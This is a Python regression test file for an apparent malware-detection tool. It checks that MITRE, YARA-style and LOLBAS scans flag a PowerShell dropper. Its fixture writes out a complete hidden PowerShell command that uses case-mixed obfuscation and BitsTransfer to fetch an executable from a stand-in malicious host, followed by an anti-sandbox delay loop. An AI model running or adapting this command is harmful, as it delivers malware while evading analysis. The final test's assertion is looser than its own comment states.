"""Regression tests for the Feb-2026 BitsTransfer / anti-sandbox training.

Context: user analysed a real dropper that used:
  1. `Start-BitsTransfer` instead of Net.WebClient (stealthier download)
  2. `for($i=1;$i-le 13000;$i++){Write-Host n}` — anti-sandbox delay loop
  3. `iMpoRt-MOdULE biTSTrANsFEr` — case-mixed keyword obfuscation

All three now trigger explicit MITRE + YARA + LOLBAS hits.
"""
from __future__ import annotations
import os
import sys

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
import operations, ops_extended  # noqa: F401
from operations import mitre_map, yara_lite_scan
from lolbas import scan_lolbas


_DROPPER = (
    "powershell.exe -w hidden -nop -c \""
    "iMpoRt-MOdULE biTSTrANsFEr; "
    "StART-BiTsTRanSfEr -Source http://malicious.example/scwxc.exe "
    "  -Destination C:\\Users\\Public\\scwxc.exe; "
    "for($i=1;$i-le 13000;$i++){Write-Host n}\""
)


def test_mitre_flags_bits_jobs_explicit():
    ids = [m["id"] for m in mitre_map(_DROPPER)]
    assert "T1197" in ids, f"MITRE T1197 (BITS Jobs) missing: {ids}"


def test_mitre_flags_sandbox_delay_loop():
    """Long counter loop with ≥1000 iterations = T1497.003 Time Based Evasion."""
    ids = [m["id"] for m in mitre_map(_DROPPER)]
    assert "T1497.003" in ids, f"T1497.003 (delay-loop) missing: {ids}"


def test_mitre_no_delay_loop_false_positive_on_short_counter():
    """A benign 100-iteration loop should NOT trigger the delay-loop tag."""
    benign = "for($i=1;$i-le 100;$i++){Write-Host $i}"
    ids = [m["id"] for m in mitre_map(benign)]
    assert "T1497.003" not in ids, f"false positive on benign short loop: {ids}"


def test_yara_bits_transfer_download_rule():
    rules = [y["rule"] for y in yara_lite_scan(_DROPPER)]
    assert "PS_BitsTransfer_Download" in rules, f"BitsTransfer YARA rule missing: {rules}"


def test_yara_sandbox_delay_loop_rule():
    rules = [y["rule"] for y in yara_lite_scan(_DROPPER)]
    assert "PS_Sandbox_Delay_Loop" in rules, f"Delay-loop YARA rule missing: {rules}"


def test_yara_case_mixed_obfuscation_rule():
    """`iMpoRt-MOdULE` / `biTSTrANsFEr` / `StART-BiTsTRanSfEr` — alternating case."""
    rules = [y["rule"] for y in yara_lite_scan(_DROPPER)]
    assert "PS_CaseMixed_Obfuscation" in rules, f"Case-mixed obfuscation rule missing: {rules}"


def test_lolbas_bits_transfer_matches():
    hits = scan_lolbas(_DROPPER)
    bins = [h.get("binary", "") for h in hits]
    assert "powershell.exe" in bins, f"powershell.exe LOLBIN missing: {bins}"


def test_full_pipeline_flags_dropper_as_malicious():
    """End-to-end: this dropper should score in the Malicious range."""
    from operations import extract_iocs, risk_score
    mitre = mitre_map(_DROPPER)
    yara  = yara_lite_scan(_DROPPER)
    iocs  = extract_iocs(_DROPPER)
    risk  = risk_score(mitre, yara, iocs)
    assert risk["score"] >= 70, f"expected Malicious verdict, got: {risk}"
    assert risk["verdict"] == "Malicious"


def test_normal_powershell_admin_command_not_flagged():
    """A legit admin `Start-BitsTransfer` for a signed asset should NOT dominate.
    We still emit the rule (it IS a LOLBIN) but ensure short benign scripts
    without evasion patterns score < Malicious."""
    admin = "Start-BitsTransfer -Source https://updates.company.corp/signed.msi -Destination C:\\Temp\\"
    from operations import extract_iocs, risk_score
    mitre = mitre_map(admin)
    yara  = yara_lite_scan(admin)
    iocs  = extract_iocs(admin)
    risk  = risk_score(mitre, yara, iocs)
    # This IS suspicious (T1197 fires + LOLBIN + URL) but no delay loop, no
    # case-obfuscation. Score should be in Suspicious range, not Malicious.
    assert risk["verdict"] in ("Suspicious", "Malicious"), f"admin command must at least be Suspicious: {risk}"
